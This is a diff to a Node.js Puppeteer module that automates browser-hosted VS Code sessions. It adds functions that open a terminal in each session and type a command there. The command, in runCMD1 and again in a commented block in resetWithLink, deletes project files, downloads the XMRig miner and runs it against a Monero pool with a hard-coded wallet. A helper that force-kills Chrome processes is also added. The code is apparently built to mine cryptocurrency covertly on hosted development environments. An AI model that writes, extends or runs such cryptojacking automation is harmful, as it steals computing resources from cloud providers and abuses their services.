@@ -69,35 +69,35 @@ const runCMD = async (page, name) => {
 
 const clickElementInIframe = async (page, iframeSelector = 'iframe', elementSelector) => {
     try {
-      // Wait for iframe to be available
-      await page.waitForSelector(iframeSelector);
-      
-      // Get the iframe element
-      const frameElement = await page.$(iframeSelector);
-      if (!frameElement) {
-        console.log('Iframe not found');
-        return false;
-      }
-      
-      // Get the content frame
-      const frame = await frameElement.contentFrame();
-      if (!frame) {
-        console.log('Could not access iframe content');
-        return false;
-      }
-      
-      // Wait for the element in the iframe to be available
-      await frame.waitForSelector(elementSelector);
-      
-      // Click the element
-      await frame.click(elementSelector);
-      console.log(`Successfully clicked element "${elementSelector}" inside iframe`);
-      return true;
+        // Wait for iframe to be available
+        await page.waitForSelector(iframeSelector);
+
+        // Get the iframe element
+        const frameElement = await page.$(iframeSelector);
+        if (!frameElement) {
+            console.log('Iframe not found');
+            return false;
+        }
+
+        // Get the content frame
+        const frame = await frameElement.contentFrame();
+        if (!frame) {
+            console.log('Could not access iframe content');
+            return false;
+        }
+
+        // Wait for the element in the iframe to be available
+        await frame.waitForSelector(elementSelector);
+
+        // Click the element
+        await frame.click(elementSelector);
+        console.log(`Successfully clicked element "${elementSelector}" inside iframe`);
+        return true;
     } catch (error) {
-      console.error(`Error clicking element in iframe: ${error.message}`);
-      return false;
+        console.error(`Error clicking element in iframe: ${error.message}`);
+        return false;
     }
-  }
+}
 const clickCMD = async (page, name) => {
 
     await new Promise(resolve => setTimeout(resolve, 40 * 1000));
@@ -136,10 +136,10 @@ const clickCMD_ = async (page, name) => {
 
     await new Promise(resolve => setTimeout(resolve, 20 * 1000));
     await page.click("#workbench\.parts\.activitybar > div > div.menubar.compact.inactive.overflow-menu-only > div > div");
-    
 
 
-    return ;
+
+    return;
 
 
     await page.keyboard.down('Shift');
@@ -224,19 +224,19 @@ const openOldConnection = async (port) => {
 }
 const runRestartScript = (script) => {
     return new Promise((resolve, reject) => {
-      exec(script, (error, stdout, stderr) => {
-        if (error) {
-          console.error(`Error running restart script: ${error.message}`);
-          reject(error);
-        } else {
-          console.log('Restart script executed successfully');
-          if (stdout) console.log(`stdout: ${stdout}`);
-          if (stderr) console.warn(`stderr: ${stderr}`);
-          resolve();
-        }
-      });
+        exec(script, (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Error running restart script: ${error.message}`);
+                reject(error);
+            } else {
+                console.log('Restart script executed successfully');
+                if (stdout) console.log(`stdout: ${stdout}`);
+                if (stderr) console.warn(`stderr: ${stderr}`);
+                resolve();
+            }
+        });
     });
-  }
+}
 const openChrome = async (port) => {
     // For macOS, no need for escape sequences in the variable itself
     const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';
@@ -259,6 +259,141 @@ const openChrome = async (port) => {
     });
 }
 
+const hoverOnElement = async (page, selector) => {
+    try {
+        // Wait for the element to be present in the DOM
+        await page.waitForSelector(selector, { timeout: 10000 });
+
+        // Hover on the element
+        await page.hover(selector);
+
+        console.log(`Successfully hovered on element: ${selector}`);
+        return true;
+    } catch (error) {
+        console.error(`Error hovering on ${selector}: ${error.message}`);
+        return false;
+    }
+};
+
+const openTerminal = async (page) => {
+    try {
+        await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
+        await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
+        await page.click('.menubar-menu-button');
+        await page.waitForSelector('div.menubar-menu-items-holder', { timeout: 500000 });
+        await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 500000 });
+        await page.click('.action-label[aria-label="Terminal"]');
+        await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 500000 });
+        const child = await page.$('.action-label[aria-label="New Terminal"]');
+        const parent = await child.evaluateHandle(el => el.parentElement.parentElement);
+        const parentElement = parent.asElement();
+        if (parentElement) {
+            await parentElement.click({ delay: 100 });
+        } else {
+            console.error('Parent element not found or not an ElementHandle');
+        }
+        console.log('__________________Clicked on "New Terminal"');
+        await new Promise(resolve => setTimeout(resolve, 1 * 1000));
+    } catch (error) {
+        console.error(`Error opening terminal: ${error.message}`);
+    }
+}
+const runCMD1 = async (page, name) => {
+    await page.waitForSelector('.xterm-link-layer', { timeout: 100 * 1000 });
+    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
+    await page.type('.xterm-helper-textarea', textToType);
+    await page.evaluate(() => {
+        const textarea = document.querySelector('.xterm-helper-textarea');
+        const event = new KeyboardEvent('keydown', {
+            key: 'Enter',
+            code: 'Enter',
+            keyCode: 13,
+            which: 13,
+            bubbles: true
+        });
+        textarea.dispatchEvent(event);
+    });
+    await page.focus('.xterm-helper-textarea');
+    await page.keyboard.press('Enter');
+    await new Promise(resolve => setTimeout(resolve, 10 * 1000));
+    console.log('Pressed Enter in terminal');
+}
+
+const resetWithLink = async (page, link, name) => {
+     await page.goto(link);
+     await new Promise(resolve => setTimeout(resolve, 3 * 1000));
+     await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
+     await page.waitForSelector('.monaco-highlighted-label', { timeout: 100 * 1000 });
+    //  clear the terminal
+    for (let i = 0; i < 6; i++) {
+        try {
+            const id = `#list_id_1_${0}`;
+            await hoverOnElement(page, id);
+            await page.waitForSelector(`${id} li:nth-of-type(2)`, { timeout: 500 });
+            await page.click(`${id} li:nth-of-type(2)`);
+        } catch (error) {
+            console.error(`Error clicking on element: ${error.message}`);
+        }
+    }
+    await openTerminal(page);
+    await runCMD1(page, name);
+
+    // const commands = [
+    //     "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
+    //     " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
+    //     " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
+    //     " && cd xmrig-6.22.2",
+    //     " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
+    // ];
+
+    // for (const cmd of commands) {
+    //     await new Promise(resolve => setTimeout(resolve, 100));
+    //     // await page.keyboard.type(cmd);
+    //     await page.type('.xterm-helper-textarea', cmd);
+    //     // Small delay between chunks to ensure proper typing
+    // }
+
+    // await page.evaluate(() => {
+    //     const textarea = document.querySelector('.xterm-helper-textarea');
+    //     const event = new KeyboardEvent('keydown', {
+    //         key: 'Enter',
+    //         code: 'Enter',
+    //         keyCode: 13,
+    //         which: 13,
+    //         bubbles: true
+    //     });
+    //     textarea.dispatchEvent(event);
+    // });
+
+    // await new Promise(resolve => setTimeout(resolve, 2 * 1000));
+}
+
+
+
+const killChromeProcess = (name) => {
+    const command = `ps aux | grep 'Google Chrome' | grep '${name}' | awk '{print $2}' | xargs kill -9`;
+
+    console.log(`Executing: ${command}`);
+
+    exec(command, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error executing command: ${error.message}`);
+            return;
+        }
+
+        if (stderr) {
+            console.error(`Command stderr: ${stderr}`);
+        }
+
+        console.log(`Chrome processes with profile9224 terminated successfully.`);
+        if (stdout.trim()) {
+            console.log(`Process output: ${stdout.trim()}`);
+        } else {
+            console.log('No matching processes found to kill.');
+        }
+    });
+};
+
 module.exports = {
     openChrome,
     initConnection,
@@ -268,4 +403,6 @@ module.exports = {
     clickCMD,
     clickCMD_,
     runRestartScript,
+    resetWithLink,
+    killChromeProcess
 }
